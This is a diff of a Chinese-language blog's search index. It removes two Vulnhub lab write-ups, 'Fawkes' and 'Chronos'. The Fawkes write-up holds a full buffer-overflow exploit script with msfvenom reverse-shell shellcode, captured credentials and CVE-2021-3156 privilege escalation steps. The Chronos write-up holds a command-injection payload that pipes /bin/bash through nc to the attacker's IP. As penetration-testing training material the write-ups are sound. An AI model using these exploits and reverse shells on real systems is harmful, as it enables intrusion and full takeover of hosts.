-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416155246.png" /></p>
-<p>输入以下命令禁用： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo root <span class="comment"># 需要先切换到root才可以，否则权限不够</span></span><br><span class="line"><span class="built_in">echo</span> 0 &gt; <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure></p>
-<p>利用图形化工具edb-debugger进行查找。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install edb-debugger <span class="comment"># 安装</span></span><br></pre></td></tr></table></figure></p>
-<h3 id="查找漏洞">2.4.1 查找漏洞</h3>
-<p>生成一个300个A的字符串，然后输入到唯一的功能点中，发现edb-debugger提示出错了</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416155927.png" /></p>
-<p>说明这里确实存在漏洞，接下来生成不重复的字符串判断一下是哪几个A出现在了EIP寄存器中。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf-pattern_create -l 300</span><br><span class="line"></span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416160325.png" /></p>
-<p>此时EIP中的值为<code>64413764</code>，即<code>d7Ad</code>（注意需要反过来），然后查找该子串在原来字符串中的偏移量 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf-pattern_offset</span><br><span class="line"></span><br><span class="line">Exact match at offset 112</span><br></pre></td></tr></table></figure></p>
-<p>生成字符串确定一下： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;print(&#x27;A&#x27;*112 + &#x27;hdfs&#x27; + &#x27;C&#x27;*50)&quot;</span></span><br><span class="line"></span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAhdfsCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416162156.png" /></p>
-<p>成功找到漏洞所在。那么该如何利用呢？这里不像之前，不存在有漏洞的函数可以利用。首先得知道一个基础知识：</p>
-<blockquote>
-<ol type="1">
-<li>EIP寄存器里存储的是CPU下次要执行的指令的地址；</li>
-<li>EBP：栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。</li>
-<li>ESP：基址指针寄存器(extended base pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。</li>
-</ol>
-</blockquote>
-<p>（我对汇编不熟悉）简单说下我的理解：如果存在漏洞的函数，可以讲EIP中的值修改为对应函数的地址，然后CPU就会自动执行存在漏洞的函数。像该靶机，不存在漏洞函数，可以通过EIP让CPU执行ESP寄存器中的指令，即寻找<code>jmp esp</code>指令。我们提前在ESP中写入反弹shell的指令（可以用msf生成）。</p>
-<h3 id="利用漏洞">2.4.2 利用漏洞</h3>
-<p>从查找漏洞的过程来看，ESP寄存器是可写入的，并且会将EIP之后的内容（即hdfs之后的内容）全部写入ESP。因此，我们先利用msf生成反弹shell的指令： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.2.4 LPORT=4444 -b <span class="string">&quot;\x00&quot;</span> -f py <span class="comment"># 生成python可利用的</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416163915.png" /></p>
-<p>然后查找<code>jmp esp</code>指令的地址，利用<code>Plugins-&gt;Opcode Search</code></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416164843.png" /></p>
-<p>要找到可执行权限的进程，然后<code>ESP-&gt;EIP</code>（个人理解：将ESP指令传给EIP）</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416164946.png" /></p>
-<p>记住地址，写入payload的时候记得反过来！</p>
-<p>然后编写利用脚本： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys,socket</span><br><span class="line">buf =  <span class="string">b&quot;&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xbb\x77\x58\x1b\xb6\xda\xc6\xd9\x74\x24\xf4\x5a\x2b&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xc9\xb1\x12\x31\x5a\x12\x03\x5a\x12\x83\xb5\x5c\xf9&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x43\x08\x86\x0a\x48\x39\x7b\xa6\xe5\xbf\xf2\xa9\x4a&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xd9\xc9\xaa\x38\x7c\x62\x95\xf3\xfe\xcb\x93\xf2\x96&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xc1\x63\x07\x62\xbe\x61\x07\x7b\x62\xef\xe6\xcb\xfc&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xbf\xb9\x78\xb2\x43\xb3\x9f\x79\xc3\x91\x37\xec\xeb&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x66\xaf\x98\xdc\xa7\x4d\x30\xaa\x5b\xc3\x91\x25\x7a&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x53\x1e\xfb\xfd&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">112</span> + <span class="string">&#x27;\x55\x9d\x04\x08&#x27;</span> + <span class="string">&#x27;\x90&#x27;</span>*<span class="number">32</span>  + buf</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    s.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">9898</span>))</span><br><span class="line">    s.send((payload))</span><br><span class="line">    s.close()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;something wrong!&#x27;</span>)</span><br><span class="line">    sys.exit()</span><br></pre></td></tr></table></figure></p>
-<p>解释：</p>
-<ul>
-<li>最开始的<code>#! /usr/bin/python</code>：当我们输入<code>./exp.py</code>时，默认最开始<code>#!</code>中的执行；</li>
-<li><code>'\x90'*32*</code>：<code>\x90</code>空，读到该字节就会继续读取下一个。这是一个技巧，使程序更稳定。如果代码的字节很紧凑，可能执行过程不会按照预期，适当的插入null不会影响执行过程，反而能够使程序的运行更加稳定。</li>
-<li>不能用python3，否则会因为payload中既有字节又有字符而报错！</li>
-</ul>
-<p>接着：</p>
-<ol type="1">
-<li>启动服务</li>
-<li>监听4444端口</li>
-<li>执行该程序<code>./exp.py</code>或者<code>python exp.py</code>都可以，不过一定要确保服务开启</li>
-</ol>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416170120.png" /></p>
-<p>接下来修改脚本，将IP地址改为<code>10.0.2.16</code>即可，然后执行该脚本，讲道理就能够获得靶机的shell。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416170549.png" /></p>
-<h2 id="信息收集">2.5 信息收集</h2>
-<p>输入<code>/bin/sh -i</code>拿到可用的shell。要加`-i。</p>
-<p>当我发现该shell的IP时察觉到不对劲</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416170810.png" /></p>
-<p>靶机的IP应该是<code>10.0.2.16</code>而不是<code>172.....</code>，并且网卡的名字也很奇怪，怀疑这可能是一个容器，查看根目录下的文件</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416171405.png" /></p>
-<p>确定了我们现在的shell是一个容器的shell。不管它，反正先收集信息就对了。</p>
-<p>首先，在当前目录下发现了一个可能是重要的文件<code>.mycreds.txt</code>，查看其内容： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HarrYp0tter@Hogwarts123</span><br></pre></td></tr></table></figure></p>
-<p>这看起来像是一个密码，不管三七二十一，先尝试一下ssh登录，两个端口的ssh都尝试一下，发现2222端口的登录成功了 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh harry@10.0.2.16 -p 2222</span><br></pre></td></tr></table></figure></p>
-<p>发现还是在容器内🤡，查看一下root目录里面的内容，发现了两个文件，内容分别为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// note.txt</span><br><span class="line">Hello Admin!!</span><br><span class="line"></span><br><span class="line">We have found that someone is trying to login to our ftp server by mistake.You are requested to analyze the traffic and figure out the user.</span><br><span class="line"></span><br><span class="line">// horcrux1.txt # 这就是第一个flag，horcrux是哈利波特里面的魂器的意思</span><br><span class="line">horcrux_&#123;NjogSGFSclkgUG90VGVyIGRFc1RyT3llZCBieSB2b2xEZU1vclQ=&#125;</span><br></pre></td></tr></table></figure></p>
-<p>base64解码：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416173101.png" /></p>
-<p>需要关注的是<code>note.txt</code>中的内容，大致的意思是：有人尝试登录ftp服务器，但是出错了，要求我们用流量分析的方法找到那人是谁。</p>
-<p>利用工具<code>tcpdump</code>分析流量： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /bin/sh <span class="comment"># 切换到root</span></span><br><span class="line">tcpdump -i eth0 port 21</span><br></pre></td></tr></table></figure></p>
-<p>过了一会开始有了数据包：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416175319.png" /></p>
-<p>前面的3个为tcp握手过程，注意红框中的信息：</p>
-<ul>
-<li>第一个红框：ftp的语法，USER后面跟的是要登录的用户名</li>
-<li>第二个红框：服务器要求对方输入密码</li>
-<li>第三个红框：ftp语法，PASS后面跟的是密码</li>
-<li>第四个红框：登陆失败</li>
-</ul>
-<p>又获得一个用户名和密码： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username: neville</span><br><span class="line">password: bL!Bsg3k</span><br></pre></td></tr></table></figure></p>
-<p>尝试登录另一个端口的ssh</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416175507.png" /></p>
-<p>登录成功，并且成功来到真实的靶机。</p>
-<h2 id="权限提升">2.6 权限提升</h2>
-<p>这次靶机的提权涉及到一个漏洞<code>CVE-2021-3156</code>，参考资料在[[#靶机信息]]中给出。msf中也存在可利用的代码。</p>
-<p>首先，先利用msf中的auxiliary模块登录ssh创建一个会话 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole <span class="comment"># 打开msfconsole</span></span><br><span class="line">use auxiliary/scanner/ssh/ssh_login</span><br><span class="line"><span class="built_in">set</span> RHOST 10.0.2.16</span><br><span class="line"><span class="built_in">set</span> username neville</span><br><span class="line"><span class="built_in">set</span> password bL!Bsg3k</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416193905.png" /></p>
-<p>然后执行下面命令： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search cve-2021-3156</span><br><span class="line">use 0</span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line"><span class="built_in">set</span> lport 5555</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
-<p>但是提示失败了</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416194156.png" /></p>
-<p>命名存在该漏洞，但是却失败了这是为什么呢。通过下载<a href="https://github.com/worawit/CVE-2021-3156">CVE-2021-3156</a>中的<code>expoit_nss.py</code>，查看其中源码（只列出部分） <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> cdll, c_char_p, POINTER, c_int, c_void_p</span><br><span class="line">SUDO_PATH = <span class="string">b&quot;/usr/bin/sudo&quot;</span></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br></pre></td></tr></table></figure></p>
-<p>注意其中的<code>SUDO_PATH</code>，我们查看靶机上sudo的路径如下：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416194714.png" /></p>
-<p>所以需要修改，然后exp就可以成功利用了。将修改之后的文件传给靶机 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">靶机: nc -lvnp 4444 &gt; exp.py</span><br><span class="line">kali: nc 10.0.2.16 4444 &lt; cve-2021-3156Exp.py -w 1</span><br></pre></td></tr></table></figure></p>
-<p>提权成功！</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416195127.png" /></p>
-<p>接着就可以查看剩下的两个flag了，一个在<code>/home/nevile/horcrux2.txt</code>，还有一个在<code>/root/horcrux3.txt</code>，内容如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// horcrux2.txt</span><br><span class="line">horcrux_&#123;NzogTmFHaU5pIHRIZSBTbkFrZSBkZVN0cm9ZZWQgQnkgTmVWaWxsZSBMb25HYm9UVG9t&#125;</span><br><span class="line"></span><br><span class="line">// horcrux3.txt</span><br><span class="line">__     __    _     _                           _     _     </span><br><span class="line">\ \   / /__ | | __| | ___ _ __ ___   ___  _ __| |_  (_)___ </span><br><span class="line"> \ \ / / _ \| |/ _` |/ _ \ &#x27;_ ` _ \ / _ \| &#x27;__| __| | / __|</span><br><span class="line">  \ V / (_) | | (_| |  __/ | | | | | (_) | |  | |_  | \__ \</span><br><span class="line">   \_/ \___/|_|\__,_|\___|_| |_| |_|\___/|_|   \__| |_|___/</span><br><span class="line">                                                           </span><br><span class="line">     _       __            _           _ </span><br><span class="line">  __| | ___ / _| ___  __ _| |_ ___  __| |</span><br><span class="line"> / _` |/ _ \ |_ / _ \/ _` | __/ _ \/ _` |</span><br><span class="line">| (_| |  __/  _|  __/ (_| | ||  __/ (_| |</span><br><span class="line"> \__,_|\___|_|  \___|\__,_|\__\___|\__,_|</span><br><span class="line">                                         </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Machine Author: Mansoor R (@time4ster)</span><br><span class="line">Machine Difficulty: Hard</span><br><span class="line">Machine Name: Fawkes</span><br><span class="line">Horcruxes Hidden in this VM: 3 horcruxes</span><br><span class="line"></span><br><span class="line">You have successfully pwned Fawkes machine &amp; defeated Voldemort.</span><br><span class="line">Here is your last hocrux: horcrux_&#123;ODogVm9sRGVNb3JUIGRFZmVBdGVkIGJZIGhBcnJZIFBvVFRlUg==&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># For any queries/suggestions feel free to ping me at email: time4ster@protonmail.com</span><br></pre></td></tr></table></figure></p>
-<p>将其中的base64编码的部分解码得到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// horcrux2.txt</span><br><span class="line">7: NaGiNi tHe SnAke deStroYed By NeVille LonGboTTom</span><br><span class="line"></span><br><span class="line">// horcrux3.txxt</span><br><span class="line">8: VolDeMorT dEfeAted bY hArrY PoTTeR</span><br></pre></td></tr></table></figure></p>
-<h1 id="总结">3 总结</h1>
-<p>该靶机的难度为高，我认为主要是涉及了许多关于二进制的渗透方法，其他攻击方法还是比较简单的。</p>
-<p>其次，还涉及了之前没有的FTP服务攻击技术。</p>
-<p>最后，通过抓包分析得到ssh用户名和密码也是非常新颖的。</p>
-<h2 id="aslr技术">3.1 ASLR技术</h2>
-<p>ASLR（Address Space Layout Randomization，地址空间随机化）技术通过加载程序的时候使用不固定的基址加载，从而干扰shellcode定位的一种保护机制。</p>
-<p>需要注意以下几点：</p>
-<ul>
-<li>它并不能解决漏洞，而是增加了利用漏洞的难度；</li>
-<li>它不追踪或报告漏洞</li>
-<li>不能对编译时没有开启ASLR支持的二进制文件提供保护</li>
-<li>不能避免被绕过</li>
-</ul>
-<p>通过对攻击者在进行缓冲区溢出攻击时所要用到的内存布局中的偏移做了随机化，ASLR 加大了攻击成功的难度，从而增强了系统的控制流完整性。</p>
-<p>在Linux中可以通过下面两条命令查看是否开启该功能： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. cat /proc/sys/kernel/randomize_va_space</span><br><span class="line">2. sysctl -a --pattern randomize</span><br></pre></td></tr></table></figure></p>
-<p><code>randomize_va_space</code>的值有三个： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0 = Disabled</span><br><span class="line">1 = Conservative Randomization</span><br><span class="line">2 = Full Randomization</span><br></pre></td></tr></table></figure></p>
-]]></content>
-      <categories>
-        <category>内网渗透</category>
-      </categories>
-      <tags>
-        <tag>综合</tag>
-        <tag>vulnhub</tag>
-        <tag>FTP服务攻击</tag>
-        <tag>流量抓包分析</tag>
-        <tag>堆溢出漏洞攻击:CVE-2021-3156</tag>
-        <tag>缓冲区溢出漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -1011,142 +1011,6 @@
         <tag>MySQL提取</tag>
         <tag>shell升级</tag>
         <tag>BP自动替换</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>3. Vulnhub Chronos Writeup</title>
-    <url>/2022/04/01/3.%20Vulnhub%20Chronos%20Writeup/</url>
-    <content><![CDATA[<p>该靶机难度简单。</p>
-<span id="more"></span>
-<h1 id="靶机信息">靶机信息</h1>
-<p>靶机地址：https://www.vulnhub.com/entry/chronos-1,735/</p>
-<p>难度：Easy</p>
-<p>虚拟机软件：Virtual Box</p>
-<p>目标：取得2个flag，获得root权限</p>
-<p>涉及的攻击方法：</p>
-<ul>
-<li>端口扫描</li>
-<li>web侦察</li>
-<li>命令注入</li>
-<li>数据编、解码</li>
-<li><strong>搜索大法</strong></li>
-<li><strong>框架漏洞利用</strong></li>
-<li>代码审计</li>
-<li>NC串联</li>
-<li>本地提权</li>
-</ul>
-<h1 id="渗透">渗透</h1>
-<p>攻击主机 kali：<code>192.168.137.104</code></p>
-<h2 id="主机发现">主机发现</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo netdiscover -r 192.168.137.0/16 </span><br><span class="line"></span><br><span class="line">如果实际的子网掩码是24位，那么上面查询的时候就减8，也就是16。实际查询的子网掩码位数设置为实际的子网掩码位数减8效果最好。</span><br></pre></td></tr></table></figure>
-<p>原理：与前面的两者相同，都是通过ARP解析</p>
-<p>结果：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401113217.png" /></p>
-<p>因此，靶机的IP为 192.168.137.105</p>
-<h2 id="端口扫描">端口扫描</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p1-65535 192.168.137.103</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401113352.png" /></p>
-<h2 id="端口服务发现">端口服务发现</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80,8000 -sV 192.168.137.105</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401113546.png" /></p>
-<p>信息：</p>
-<ol type="1">
-<li>22端口上的服务为openssh</li>
-<li>80端口上的服务为http，版本为 2.4.29</li>
-<li>8000端口上的服务也是http，但是用的 <code>node.js express framework</code></li>
-<li>系统为Ubuntu</li>
-</ol>
-<h2 id="访问http服务">访问http服务</h2>
-<p>有三件事必须做：</p>
-<ol type="1">
-<li>抓包</li>
-<li>看源码</li>
-<li>扫目录</li>
-</ol>
-<p>发现80端口和8000端口很类似（一个朴素，一个华丽），源码是一样的，其中有一串特殊的字符： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var _0x5bdf=[&#x27;150447srWefj&#x27;,&#x27;70lwLrol&#x27;,&#x27;1658165LmcNig&#x27;,&#x27;open&#x27;,&#x27;1260881JUqdKM&#x27;,&#x27;10737CrnEEe&#x27;,&#x27;2SjTdWC&#x27;,&#x27;readyState&#x27;,&#x27;responseText&#x27;,&#x27;1278676qXleJg&#x27;,&#x27;797116soVTES&#x27;,&#x27;onreadystatechange&#x27;,&#x27;http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL&#x27;,&#x27;User-Agent&#x27;,&#x27;status&#x27;,&#x27;1DYOODT&#x27;,&#x27;400909Mbbcfr&#x27;,&#x27;Chronos&#x27;,&#x27;2QRBPWS&#x27;,&#x27;getElementById&#x27;,&#x27;innerHTML&#x27;,&#x27;date&#x27;];(function(_0x506b95,_0x817e36)&#123;var _0x244260=_0x432d;while(!![])&#123;try&#123;var _0x35824b=-parseInt(_0x244260(0x7e))*parseInt(_0x244260(0x90))+parseInt(_0x244260(0x8e))+parseInt(_0x244260(0x7f))*parseInt(_0x244260(0x83))+-parseInt(_0x244260(0x87))+-parseInt(_0x244260(0x82))*parseInt(_0x244260(0x8d))+-parseInt(_0x244260(0x88))+parseInt(_0x244260(0x80))*parseInt(_0x244260(0x84));if(_0x35824b===_0x817e36)break;else _0x506b95[&#x27;push&#x27;](_0x506b95[&#x27;shift&#x27;]());&#125;catch(_0x3fb1dc)&#123;_0x506b95[&#x27;push&#x27;](_0x506b95[&#x27;shift&#x27;]());&#125;&#125;&#125;(_0x5bdf,0xcaf1e));function _0x432d(_0x16bd66,_0x33ffa9)&#123;return _0x432d=function(_0x5bdf82,_0x432dc8)&#123;_0x5bdf82=_0x5bdf82-0x7e;var _0x4da6e8=_0x5bdf[_0x5bdf82];return _0x4da6e8;&#125;,_0x432d(_0x16bd66,_0x33ffa9);&#125;function loadDoc()&#123;var _0x17df92=_0x432d,_0x1cff55=_0x17df92(0x8f),_0x2beb35=new XMLHttpRequest();_0x2beb35[_0x17df92(0x89)]=function()&#123;var _0x146f5d=_0x17df92;this[_0x146f5d(0x85)]==0x4&amp;&amp;this[_0x146f5d(0x8c)]==0xc8&amp;&amp;(document[_0x146f5d(0x91)](_0x146f5d(0x93))[_0x146f5d(0x92)]=this[_0x146f5d(0x86)]);&#125;,_0x2beb35[_0x17df92(0x81)](&#x27;GET&#x27;,_0x17df92(0x8a),!![]),_0x2beb35[&#x27;setRequestHeader&#x27;](_0x17df92(0x8b),_0x1cff55),_0x2beb35[&#x27;send&#x27;]();&#125;</span><br></pre></td></tr></table></figure></p>
-<p>乍一看，好像是加密的js代码。这里推荐一个网址，可以对代码进行美化和编码解码：https://gchq.github.io/CyberChef/</p>
-<p>利用<code>javascript beautify</code>模块美化之后虽然看的很清楚了，但是因为各种参数都加密了还是无法直到这段代码的意思。但是其中有一串字符没有加密： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</span><br></pre></td></tr></table></figure></p>
-<p>最后，抓包看一下：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401114650.png" /></p>
-<p>发现确实有数据包往 chronos.local:8000 地方发送，但是我们无法用浏览器直接访问，因为kali并不知道chronos.local是哪台主机，但是我们知道，这应该就是靶机。因此，修改<code>/etc/hosts</code>，添加一条记录：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401120624.png" /></p>
-<p>然后可以访问了，并且页面发生了变化。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401120700.png" /></p>
-<p>结合url分析，发现url中的那一串字符像是警告base64编码的，因此，再次利用刚刚的网址进行解码。利用 <code>magic</code> 模块进行解码，发现是base58编码。得到解码后的结果：<code>'+Today is %A, %B %d, %Y %H:%M:%S.'</code></p>
-<blockquote>
-<p>base系列有许多，但是常见的是base64和base32。还有许多不常见的，比如这里的base58。</p>
-</blockquote>
-<ol type="1">
-<li>date</li>
-<li><code>'+Today is %A, %B %d, %Y %H:%M:%S.'</code></li>
-<li>页面上显示的时间信息</li>
-</ol>
-<p>这让我想到Linux中的date命令，也是能够显示时间，因此在kali上尝试一下如下代码： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">date &#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401121236.png" /></p>
-<p>发现结果和页面显示的一模一样（未经过渲染）。因此，有理由怀疑后台服务调用了系统命令，并且后台代码可能如下（猜测，并不是真正的代码，只是说明代码逻辑）： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd = &#x27;date&#x27; .$format;</span><br><span class="line">system(cmd);</span><br></pre></td></tr></table></figure></p>
-<p>如果我们什么都不修改，那么执行的命令就是<code>date '+Today is %A, %B %d, %Y %H:%M:%S.'</code>，因此，我们可以考虑到Linux中以下执行多条命令（上周使用的是管道符，这周使用 <code>$$</code>，该符号只有在前面的命令正确执行的情况下，才会执行后面的命令）</p>
-<p>先做一个尝试， <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;&amp;ls -&gt; yZSGA</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401134641.png" /></p>
-<p>成功执行，因此这里确实调用了系统命令。接下来使用nc串联来反弹shell（先判断是否有nc，然后再判断是否有 -e）</p>
-<h2 id="反弹shell">反弹shell</h2>
-<p>首先在kali上启动两个监听端口： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lnvp 3333</span><br><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure></p>
-<p>然后将payload base58编码： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;&amp;nc 192.168.137.104 3333|/bin/bash|nc 192.168.137.104 4444</span><br><span class="line">2XqeYgBDNepmM9vgTVeLGrep4fZHdsG5tAFHFFoH1pgfmPx59cE4Pphh2FNWaHBapy5Tin3Vs6E4MYXhu</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401135228.png" /></p>
-<p>虽然提示出错，但是kali已经成功连接上了</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401135325.png" /></p>
-<p>接下来进行信息收集：</p>
-<p>发现在 <code>/home/imera</code> 目录下有一个<code>user.txt</code>文件，但是却没有权限读取，这应该就是其中一个flag了。并且在<code>/root</code>目录下也有一个flag，这应该是第二个flag，不出意料也没有权限读取。</p>
-<p>还可以看一下 <code>app.js</code> <code>package.jsom</code> 和 <code>package-lock.json</code> 的内容，其中第一个的源码如下： <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// created by alienum for Penetration Testing</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123;exec&#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bs58 = <span class="built_in">require</span>(<span class="string">&#x27;bs58&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8000</span>;</span><br><span class="line"><span class="keyword">const</span> cors = <span class="built_in">require</span>(<span class="string">&#x27;cors&#x27;</span>);</span><br><span class="line">app.use(cors());</span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	res.sendFile(<span class="string">&#x27;/var/www/html/index.html&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">app.get(<span class="string">&#x27;/date&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> agent = req.headers[<span class="string">&#x27;user-agent&#x27;</span>];</span><br><span class="line">	<span class="keyword">var</span> cmd = <span class="string">&#x27;date &#x27;</span>;</span><br><span class="line">	<span class="keyword">const</span> format = req.query.format;</span><br><span class="line">	<span class="keyword">const</span> bytes = bs58.decode(format);</span><br><span class="line">	<span class="keyword">var</span> decoded = bytes.toString();</span><br><span class="line">	<span class="keyword">var</span> concat = cmd.concat(decoded);</span><br><span class="line">	<span class="keyword">if</span> (agent === <span class="string">&#x27;Chronos&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (concat.includes(<span class="string">&#x27;id&#x27;</span>) || concat.includes(<span class="string">&#x27;whoami&#x27;</span>) || concat.includes(<span 